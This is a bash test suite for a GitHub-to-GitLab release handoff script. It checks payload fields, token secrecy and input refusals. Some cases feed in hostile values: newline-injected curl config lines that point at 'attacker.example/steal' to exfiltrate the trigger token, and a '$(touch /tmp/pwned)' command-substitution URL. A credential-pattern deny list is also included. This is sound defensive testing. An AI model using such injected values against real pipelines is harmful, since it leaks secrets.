#!/usr/bin/env bash
# Tests for gitlab-handoff.sh.
#
# This script is the only thing that crosses the GitHub → GitLab trust
# boundary, so what it sends and what it refuses to send are both asserted. A
# stubbed `curl` records the request without anything leaving the machine, and
# the recorded curl config is inspected field by field: "it exited 0" would not
# prove the digests were passed correctly, or that a credential was not.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HANDOFF="$SCRIPT_DIR/gitlab-handoff.sh"

pass=0
fail=0
DIGEST="sha256:$(printf 'c%.0s' {1..64})"
API_DIGEST="sha256:$(printf 'a%.0s' {1..64})"
ING_DIGEST="sha256:$(printf 'b%.0s' {1..64})"
WEB_DIGEST="sha256:$(printf 'd%.0s' {1..64})"
COMMIT="0123456789abcdef0123456789abcdef01234567"
TOKEN="glptt-supersecret-trigger-token-value"

STUB_DIR=$(mktemp -d)
trap 'rm -rf "$STUB_DIR"' EXIT

# `curl` that copies the config it was handed (so the payload can be inspected)
# and replies with whatever the current case wants.
write_curl_stub() {
  cat >"$STUB_DIR/curl" <<STUB
#!/usr/bin/env bash
echo "invoked" >> "\$CURL_STUB_MARKER"
while [[ \$# -gt 0 ]]; do
  case "\$1" in
    --config) cp "\$2" "\$CURL_STUB_CONFIG"; shift 2 ;;
    *) shift ;;
  esac
done
cat "\$CURL_STUB_RESPONSE"
STUB
  chmod +x "$STUB_DIR/curl"
}
write_curl_stub

run_handoff() {
  rm -f "$STUB_DIR/marker" "$STUB_DIR/config"
  GITHUB_OUTPUT="${GITHUB_OUTPUT:-$STUB_DIR/gh_output}" \
  CURL_STUB_MARKER="$STUB_DIR/marker" \
  CURL_STUB_CONFIG="$STUB_DIR/config" \
  CURL_STUB_RESPONSE="$STUB_DIR/response" \
  PATH="$STUB_DIR:$PATH" \
  GITLAB_TRIGGER_TOKEN="$TOKEN" \
  EXPECTED_IMAGE_REPOSITORY="ghcr.io/testowner" \
    "$HANDOFF" "$@" >"$STUB_DIR/stdout" 2>"$STUB_DIR/stderr"
  echo $?
}

# Shaped like a REAL GitLab trigger response, not a four-field stub. The
# nesting is the point: `"user":{"id":…,"web_url":…}` is what made a greedy
# `.*"id"` extraction return the trigger bot's user id and a link to its
# profile page instead of the pipeline.
ok_response() {
  cat >"$STUB_DIR/response" <<'JSON'
{"id":4242,"iid":7,"project_id":31,"sha":"0123456789abcdef0123456789abcdef01234567","ref":"develop","status":"created","source":"trigger","web_url":"https://gitlab.com/infinity/infinity-core/-/pipelines/4242","user":{"id":99,"username":"trigger-bot","web_url":"https://gitlab.com/trigger-bot"},"detailed_status":{"id":7,"label":"created","details_path":"/infinity/infinity-core/-/pipelines/4242"}}
HTTP_STATUS:201
JSON
}
error_response() {
  cat >"$STUB_DIR/response" <<'JSON'
{"message":"404 Not Found"}
HTTP_STATUS:404
JSON
}

valid_args=(
  --commit "$COMMIT"
  --api "ghcr.io/testowner/testinbox-api@$API_DIGEST"
  --ingestion "ghcr.io/testowner/testinbox-ingestion@$ING_DIGEST"
  --migrator "ghcr.io/testowner/testinbox-migrator@$DIGEST"
  --web "ghcr.io/testowner/testinbox-web@$WEB_DIGEST"
)

record() {
  local name="$1" condition="$2"
  if [[ "$condition" == "ok" ]]; then
    echo "ok   — $name"; pass=$((pass + 1))
  else
    echo "FAIL — $name"; fail=$((fail + 1))
  fi
}

expect_field() {
  local name="$1" expected="$2"
  if grep -qF "$expected" "$STUB_DIR/config"; then
    record "$name" ok
  else
    record "$name" no
    echo "       missing from payload: $expected"
  fi
}

# --- the happy path, field by field ------------------------------------------
ok_response
status=$(run_handoff "${valid_args[@]}")
record "a valid release candidate is handed off (exit 0)" "$([[ "$status" == 0 ]] && echo ok || echo no)"
expect_field "environment is fixed to staging"      'variables[TESTINBOX_ENVIRONMENT]=staging'
expect_field "commit SHA is passed exactly"         "variables[TESTINBOX_COMMIT_SHA]=$COMMIT"
expect_field "api digest is passed exactly"         "variables[TESTINBOX_API_DIGEST]=ghcr.io/testowner/testinbox-api@$API_DIGEST"
expect_field "ingestion digest is passed exactly"   "variables[TESTINBOX_INGESTION_DIGEST]=ghcr.io/testowner/testinbox-ingestion@$ING_DIGEST"
expect_field "migrator digest is passed exactly"    "variables[TESTINBOX_MIGRATOR_DIGEST]=ghcr.io/testowner/testinbox-migrator@$DIGEST"
expect_field "web digest is passed exactly"         "variables[TESTINBOX_WEB_DIGEST]=ghcr.io/testowner/testinbox-web@$WEB_DIGEST"
expect_field "pipeline ref is develop"              'form-string = "ref=develop"'
expect_field "the endpoint is GitLab's pipeline trigger" '/projects/infinity%2Finfinity-core/trigger/pipeline'
expect_field "the request is a POST"                'request = "POST"'
expect_field "the token is sent as a multipart form field, as the API expects" 'form-string = "token='
expect_field "https is enforced on the wire"        'proto = "=https"'

# --- what must NEVER be in the payload ---------------------------------------
forbidden=0
for pattern in SSH_ ssh PRIVATE_KEY DB_PASSWORD S3_SECRET SMTP API_KEY BOOTSTRAP; do
  if grep -qi "$pattern" "$STUB_DIR/config"; then
    echo "       payload contains forbidden material matching '$pattern'"
    forbidden=1
  fi
done
record "no host, SSH, database, object-store, SMTP or API credential in the payload" \
  "$([[ "$forbidden" == 0 ]] && echo ok || echo no)"

# The token must reach curl (it is the credential) but must never be printed.
record "the trigger token is sent to curl" \
  "$(grep -qF "token=$TOKEN" "$STUB_DIR/config" && echo ok || echo no)"
record "the trigger token is never printed" \
  "$(! grep -qF "$TOKEN" "$STUB_DIR/stdout" "$STUB_DIR/stderr" && echo ok || echo no)"

# --- the response is reported without being mistaken for a deployment --------
record "the PIPELINE id and url are reported, not the nested user's" \
  "$(grep -q 'pipeline id:  4242' "$STUB_DIR/stdout" \
     && grep -q 'pipelines/4242' "$STUB_DIR/stdout" \
     && ! grep -q 'trigger-bot' "$STUB_DIR/stdout" \
     && echo ok || echo no)"
record "the wording says handoff accepted, never deployment succeeded" \
  "$(grep -q 'RELEASE HANDOFF ACCEPTED' "$STUB_DIR/stdout" \
     && ! grep -qi 'deployment succeeded\|deployed successfully' "$STUB_DIR/stdout" "$STUB_DIR/stderr" \
     && echo ok || echo no)"

# --- refusals: nothing may leave the runner ----------------------------------
refuses() {
  local name="$1"; shift
  ok_response
  local status
  status=$(run_handoff "$@")
  local reached=no
  [[ -f "$STUB_DIR/marker" ]] && reached=yes
  if [[ "$status" != "0" && "$reached" == "no" ]]; then
    record "$name" ok
  else
    record "$name" no
    echo "       exit $status, curl reached=$reached"
  fi
}

refuses "a short commit SHA is refused before any request" \
  --commit "0123456" --api "ghcr.io/testowner/testinbox-api@$API_DIGEST" \
  --ingestion "ghcr.io/testowner/testinbox-ingestion@$ING_DIGEST" \
  --migrator "ghcr.io/testowner/testinbox-migrator@$DIGEST" --web "ghcr.io/testowner/testinbox-web@$WEB_DIGEST"

refuses "an uppercase commit SHA is refused" \
  --commit "0123456789ABCDEF0123456789abcdef01234567" --api "ghcr.io/testowner/testinbox-api@$API_DIGEST" \
  --ingestion "ghcr.io/testowner/testinbox-ingestion@$ING_DIGEST" \
  --migrator "ghcr.io/testowner/testinbox-migrator@$DIGEST" --web "ghcr.io/testowner/testinbox-web@$WEB_DIGEST"

refuses "a missing digest is refused" \
  --commit "$COMMIT" --api "" \
  --ingestion "ghcr.io/testowner/testinbox-ingestion@$ING_DIGEST" \
  --migrator "ghcr.io/testowner/testinbox-migrator@$DIGEST" --web "ghcr.io/testowner/testinbox-web@$WEB_DIGEST"

refuses "a mutable tag instead of a digest is refused" \
  --commit "$COMMIT" --api "ghcr.io/testowner/testinbox-api:develop" \
  --ingestion "ghcr.io/testowner/testinbox-ingestion@$ING_DIGEST" \
  --migrator "ghcr.io/testowner/testinbox-migrator@$DIGEST" --web "ghcr.io/testowner/testinbox-web@$WEB_DIGEST"

refuses "an image from another owner is refused" \
  --commit "$COMMIT" --api "ghcr.io/attacker/testinbox-api@$API_DIGEST" \
  --ingestion "ghcr.io/testowner/testinbox-ingestion@$ING_DIGEST" \
  --migrator "ghcr.io/testowner/testinbox-migrator@$DIGEST" --web "ghcr.io/testowner/testinbox-web@$WEB_DIGEST"

# Missing token: refused, and the refusal names the variable rather than a value.
rm -f "$STUB_DIR/marker"
CURL_STUB_MARKER="$STUB_DIR/marker" CURL_STUB_CONFIG="$STUB_DIR/config" CURL_STUB_RESPONSE="$STUB_DIR/response" \
PATH="$STUB_DIR:$PATH" EXPECTED_IMAGE_REPOSITORY="ghcr.io/testowner" \
  env -u GITLAB_TRIGGER_TOKEN "$HANDOFF" "${valid_args[@]}" >/dev/null 2>&1
token_status=$?
record "a missing trigger token refuses before any request" \
  "$([[ "$token_status" != "0" && ! -f "$STUB_DIR/marker" ]] && echo ok || echo no)"

# --- config-file option injection --------------------------------------------
# GITLAB_REF/PROJECT/API_URL land in a curl CONFIG FILE, which is line-oriented.
# A newline in any of them injects options AFTER the line carrying the token —
# a second `url =` makes curl POST the whole form, token included, to another
# host. They come from repository variables, which are writable with a weaker
# permission than reading a secret, so this is a privilege escalation.
injection_refused() {
  local name="$1" var="$2" value="$3"
  ok_response
  rm -f "$STUB_DIR/marker" "$STUB_DIR/config"
  env "$var=$value" \
    CURL_STUB_MARKER="$STUB_DIR/marker" CURL_STUB_CONFIG="$STUB_DIR/config" \
    CURL_STUB_RESPONSE="$STUB_DIR/response" PATH="$STUB_DIR:$PATH" \
    GITLAB_TRIGGER_TOKEN="$TOKEN" EXPECTED_IMAGE_REPOSITORY="ghcr.io/testowner" \
    "$HANDOFF" "${valid_args[@]}" >/dev/null 2>&1
  local status=$?
  if [[ "$status" != "0" && ! -f "$STUB_DIR/marker" ]]; then
    record "$name" ok
  else
    record "$name" no
    echo "       exit $status; curl reached=$([[ -f "$STUB_DIR/marker" ]] && echo yes || echo no)"
  fi
}

injection_refused "a newline in GITLAB_REF cannot inject a second curl url" \
  GITLAB_REF "$(printf 'develop"\nurl = https://attacker.example/steal\nform-string = "x=y')"
injection_refused "a newline in GITLAB_PROJECT is refused" \
  GITLAB_PROJECT "$(printf 'infinity%%2Fcore"\nurl = https://attacker.example/steal')"
injection_refused "a non-https GITLAB_API_URL is refused" \
  GITLAB_API_URL "http://gitlab.internal/api/v4"
injection_refused "an unencoded GITLAB_PROJECT path is refused rather than 404ing later" \
  GITLAB_PROJECT "infinity/infinity-core"

# --- a 2xx that is not GitLab must not read as an accepted handoff -----------
cat >"$STUB_DIR/response" <<'JSON'
<html><body>Access denied by proxy</body></html>
HTTP_STATUS:200
JSON
status=$(run_handoff "${valid_args[@]}")
record "a 2xx carrying no pipeline id fails rather than claiming acceptance" \
  "$([[ "$status" != "0" ]] && echo ok || echo no)"

# --- a hostile pipeline URL must never reach a shell -------------------------
cat >"$STUB_DIR/response" <<'JSON'
{"id":99,"web_url":"https://gitlab.com/$(touch /tmp/pwned)/-/pipelines/99"}
HTTP_STATUS:201
JSON
GITHUB_OUTPUT="$STUB_DIR/gh_output" run_handoff "${valid_args[@]}" >/dev/null
record "a pipeline URL containing shell metacharacters is dropped, not forwarded" \
  "$(! grep -q 'touch' "$STUB_DIR/gh_output" 2>/dev/null && echo ok || echo no)"

# --- a rejected trigger must fail the job ------------------------------------
error_response
status=$(run_handoff "${valid_args[@]}")
record "a non-2xx from GitLab fails the handoff" "$([[ "$status" != "0" ]] && echo ok || echo no)"
record "a failed handoff still does not print the token" \
  "$(! grep -qF "$TOKEN" "$STUB_DIR/stdout" "$STUB_DIR/stderr" && echo ok || echo no)"

echo "----"
echo "gitlab-handoff.test.sh: $pass passed, $fail failed"
(( fail == 0 ))
